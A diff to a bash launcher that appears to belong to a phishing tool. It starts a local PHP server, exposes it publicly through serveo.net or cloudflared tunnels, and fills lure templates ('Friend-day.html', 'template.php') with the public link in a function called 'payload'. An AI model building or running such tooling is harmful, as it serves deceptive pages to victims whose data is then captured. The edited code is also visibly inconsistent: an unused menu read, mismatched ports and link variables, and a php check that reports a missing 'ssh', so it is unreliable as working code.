@@ -1,7 +1,5 @@
 #!/bin/bash
 clear
-wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64
-chmod +x cloudflared
 printf "\n"
 printf "\n"
 printf "\n"
@@ -167,19 +165,19 @@ echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   -------------------
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !      STARTING SERVEO      !  \e[0m'
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------   \e[0m'
 
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
 
-echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Cloudflared...\e[0m  "
-			   echo -ne "  "
-   		           if [[ `command -v termux-chroot` ]]; then
-			  sleep 2 && termux-chroot ./cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
-   			  else
-     		           sleep 2 && ./cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
-   	                 fi
-			{ sleep 2; clear; }
+if [[ $subdomain_resp == true ]]; then
 
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
 
+sleep 8
+else
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
 
-sleep 2
+sleep 8
 fi
 echo ""
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
@@ -188,7 +186,7 @@ echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   -------------------
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
-send_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
 
 }
@@ -277,11 +275,22 @@ fi
 
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflare (PRO)\e[0m\n"
 default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option [DEFAULT IS 1]: \e[0m' option_server
-option_server="${option_server:-${default_option_server}}"
-if [[ $option_server -eq 2 ]]; then
+read -p $' \e[0m'
+wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared-linux-arm64
+chmod +x cloudflared-linux-arm64
+echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Cloudflared...\e[0m  "
+			   echo -ne "  "
+   		           if [[ `command -v termux-chroot` ]]; then
+			  sleep 2 && termux-chroot ./cloudflared-linux-arm64 tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
+   			  else
+     		           sleep 2 && ./cloudflared-linux-arm64 tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
+   	                 fi
+			{ sleep 8; clear; }
+				clink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
+			   
+			   echo ""
 
 command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 start
@@ -300,7 +309,9 @@ fi
 
 payload() {
 
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
+printf "\e[1;33m\e[0m\e[1;33m Cloudflared Link :\e[0m\e[1;77m %s\e[0m\n" $clink                                   
+echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
 
 sed 's+forwarding_link+'$send_link'+g' Friend-day.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
@@ -311,8 +322,6 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 
-fi
-
 server
 payload
 checkfound
@@ -322,4 +331,3 @@ checkfound
 banner
 dependencies
 start1
-
